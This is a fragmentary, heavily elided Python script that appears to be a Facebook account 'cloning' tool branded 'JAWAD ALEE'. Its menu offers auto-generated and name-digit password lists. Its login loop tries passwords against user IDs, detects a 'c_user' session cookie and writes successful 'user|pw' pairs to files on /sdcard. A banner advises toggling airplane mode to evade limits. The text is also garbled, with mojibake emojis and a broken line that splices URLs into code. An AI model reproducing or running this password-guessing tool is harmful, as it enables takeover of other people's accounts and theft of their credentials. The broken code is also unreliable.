...
def main_apv():
    ...
    try:
        ...
        print ("[J]ðŸ’¯ðŸ’¯ðŸ’¯ðŸ’¯ðŸ’¯ðŸ’¯ðŸ’¯ðŸ’¯ðŸ’¯ðŸ’¯ðŸ’¯ðŸ’¯ðŸ’¯ðŸ’¯ðŸ’¯ðŸ’¯ðŸ’¯[M]")
...
──◌➗◌╯╿╰⋆⋆⋆╯╿╰◌➗◌──
 ...
 \033[1;32m Use Airplane Mod Every 10 Min  \033[1;32m

 [J]_____________________________________[M]"""                           
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    input("\x1b[1;97mPress enter to back JAWAD Menu ")
...
def R():
			...
			print("               \033[1;92mâ€¢ FATHER â€¢ \033[1;97m")

			print (' [$]_____________________________________[$]')

			print ("\033[1m [!] Tool    : JAWAD ALEE")

			print (" [!] Brand   : JAWAD ALEE")
			...
			print(" [A] Start CLONING  ")

			print(" [B] Create Supper File [ not working ]")
			...
			print (' [J]_____________________________________[M]')
			...
			elif key in ["4", "04"https://www.facebook.com/f44THH3RRhttps://www.facebook.com/f44THH3RR/")
...
class __xxx__:
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [jawad-ok ðŸ¤«] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/JAWAD_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/JAWAD_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def __pler__(self):
        ...
        print(' [1] CLONE With Auto Pass ')

        print(' [2] CLONE With Name Digit Pass')
        ...
        if chi == '':
            ...
            print("\033[1;32m      ITXX____JAWAD_ALEE \033[1;37m")

            print(" [J]_____________________________________M]")
            ...
            print("\033[1;32m      ITXX__JAWAD \033[1;37m")
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+03033421971")
